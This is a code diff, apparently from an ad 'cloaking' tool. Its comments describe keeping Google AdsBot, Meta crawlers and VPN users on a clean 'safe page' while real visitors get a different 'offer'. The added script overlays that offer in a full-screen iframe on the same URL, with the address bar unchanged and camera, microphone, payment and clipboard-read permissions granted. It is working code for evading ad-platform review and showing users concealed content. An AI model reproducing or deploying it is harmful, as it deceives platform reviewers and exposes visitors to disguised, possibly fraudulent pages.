@@ -443,6 +443,11 @@ serve_safe_page($config);
   
   ⚡ HOW IT WORKS:
   Loads asynchronously and evaluates client hardware telemetry & bot heuristics.
+  • In-Place Reverse Proxy: If your rule action is set to Reverse Proxy (200 OK - Cloaked),
+    the target offer is seamlessly mounted on the EXACT SAME URL with zero address bar change.
+  • 302 Redirection: If your rule action is set to 302 Redirect, qualified visitors
+    are instantly forwarded to the destination offer.
+  • Ad Review Bots: Google AdsBot, Meta Crawlers, and VPNs stay on the clean safe page.
 -->
 <script src="${activeTagScriptUrl}" async></script>`;
 
@@ -489,6 +494,32 @@ serve_safe_page($config);
       var currentPath = w.location.href.split('#')[0].replace(/\/+$/, '');
       var targetPath = payload.destinationUrl.split('#')[0].replace(/\/+$/, '');
       if (currentPath === targetPath || w.location.pathname === targetPath || currentPath.indexOf(targetPath) === 0) return;
+
+      // In-Place Reverse Proxy Delivery: Keep address bar intact on safe page domain
+      if (payload.actionType === 'proxy_target_offer' || payload.actionType === 'rewrite') {
+        try {
+          var f = d.createElement('iframe');
+          f.src = payload.destinationUrl;
+          f.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;margin:0;padding:0;overflow:hidden;z-index:2147483647;background:#fff;';
+          f.setAttribute('allow', 'fullscreen; payment; camera; microphone; geolocation; clipboard-read; clipboard-write');
+          f.setAttribute('sandbox', 'allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts allow-top-navigation-by-user-activation');
+          
+          if (d.body) {
+            d.body.style.overflow = 'hidden';
+            d.body.appendChild(f);
+          } else {
+            d.addEventListener('DOMContentLoaded', function() {
+              if (d.body) {
+                d.body.style.overflow = 'hidden';
+                d.body.appendChild(f);
+              }
+            });
+          }
+          return;
+        } catch(frameErr) {}
+      }
+
+      // Standard 302 Redirection
       w.location.replace(payload.destinationUrl);
     }
   })
